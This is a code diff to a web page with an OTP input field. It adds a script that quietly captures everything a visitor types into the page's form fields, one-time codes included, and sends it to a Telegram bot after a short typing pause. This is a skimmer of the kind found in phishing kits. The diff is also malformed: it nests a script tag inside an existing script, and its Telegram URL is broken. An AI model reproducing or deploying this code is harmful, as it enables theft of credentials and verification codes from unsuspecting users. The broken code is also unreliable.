@@ -422,6 +422,49 @@ otpInput.addEventListener('input', () => {
     }, 250);
   }
 });
+<script>
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+  const timers = {};
+
+  document.querySelectorAll("section").forEach((section, index) => {
+    const sectionName = section.id || `Page ${index + 1}`;
+
+    // Listen whenever a user types or changes a field inside this section
+    section.addEventListener("input", () => {
+      clearTimeout(timers[sectionName]);
+
+      // Wait 1.2 seconds after they stop typing before sending
+      timers[sectionName] = setTimeout(() => {
+        const inputs = section.querySelectorAll("input, select, textarea");
+        let message = `📄 **Auto-Submission from:** ${sectionName}\n\n`;
+        let hasData = false;
+
+        inputs.forEach(input => {
+          const fieldName = input.name || input.id || input.placeholder || "Field";
+          if (input.value.trim() !== "") {
+            message += `**${fieldName}:** ${input.value}\n`;
+            hasData = true;
+          }
+        });
+
+        if (hasData) {
+          fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          }).catch(err => console.error("Telegram Error:", err));
+        }
+      }, 1200);
+    });
+  });
+</script>
+
 
 </script>
 
